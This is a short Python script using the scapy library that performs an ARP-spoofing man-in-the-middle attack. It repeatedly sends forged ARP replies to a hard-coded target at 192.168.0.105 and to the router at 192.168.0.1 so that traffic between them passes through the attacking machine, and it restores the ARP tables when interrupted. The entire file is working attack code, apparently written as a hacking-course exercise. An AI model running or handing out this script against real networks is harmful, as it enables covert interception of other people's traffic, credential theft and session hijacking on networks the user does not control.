#!/usr/local/env python

import scapy.all as scapy
import time
import sys

#scapy.ls(scapy.ARP)
#packet = scapy.ARP()

def get_mac(ip):
    arp_request           = scapy.ARP(pdst=ip)
    broadcast             = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list         = scapy.srp(arp_request_broadcast, timeout=1, verbose = False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac            = get_mac(target_ip)
    packet                = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    #print(packet.show())
    #print(packet.summary())
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac       = get_mac(destination_ip)
    source_mac            = get_mac(source_ip)
    packet                = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    #print(packet.show())
    #print(packet.summary())
    scapy.send(packet, count=4, verbose=False)

target_ip                 = "192.168.0.105"
router_ip                 = "192.168.0.1"

try:
    sent_packets_count    = 0
    while True:
        spoof(target_ip, router_ip)
        spoof(router_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Packets sent ==> "+str(sent_packets_count)),
# \r tells your terminal emulator to move the cursor at the start of the line.
        sys.stdout.flush()
# Don't store anything in the buffer
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C .. Resetting ARP Table .. Please wait ! ")
    restore(target_ip, router_ip)
    restore(router_ip, target_ip)
